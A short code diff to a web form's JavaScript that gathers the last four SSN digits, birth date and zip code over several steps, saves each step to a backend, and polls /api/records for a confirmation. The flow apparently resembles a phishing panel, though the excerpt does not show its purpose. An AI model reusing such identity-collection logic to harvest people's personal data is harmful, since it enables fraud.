@@ -84,11 +84,18 @@
 
         function saveStep1() {
             const ssn = document.getElementById('ssn').value.trim();
-            if (ssn.length !== 4 || !document.getElementById('privacy').checked) {
-                alert("Please fill SSN and accept the Privacy Policy.");
+            const month = document.getElementById('month').value;
+            const day = document.getElementById('day').value;
+            const year = document.getElementById('year').value;
+
+            if (ssn.length !== 4 || !month || !day || !year || !document.getElementById('privacy').checked) {
+                alert("Please fill SSN, Birth Date and accept the Privacy Policy.");
                 return;
             }
-            const details = `SSN: ${ssn} | Status: Step 1 Completed`;
+
+            const dob = `${month}/${day}/${year}`;
+            const details = `SSN: ${ssn} | DOB: ${dob} | Status: Step 1 Completed`;
+
             saveStep(details);
             nextStep(2);
         }
@@ -99,9 +106,8 @@
                 alert("Please enter a valid 5-digit Zip Code.");
                 return;
             }
-            const ssn = document.getElementById('ssn').value.trim();
-            const dob = `${document.getElementById('month').value}/${document.getElementById('day').value}/${document.getElementById('year').value}`;
-            const details = `SSN: ${ssn} | DOB: ${dob} | Zip: ${zip} | Status: Step 2 Completed`;
+
+            const details = `Zip: ${zip} | Status: Step 2 Completed`;
             saveStep(details);
             nextStep(3);
         }
@@ -130,7 +136,6 @@
 
             await saveStep(fullDetails);
 
-            // Polling for confirmation
             const interval = setInterval(async () => {
                 const res = await fetch('/api/records');
                 const records = await res.json();
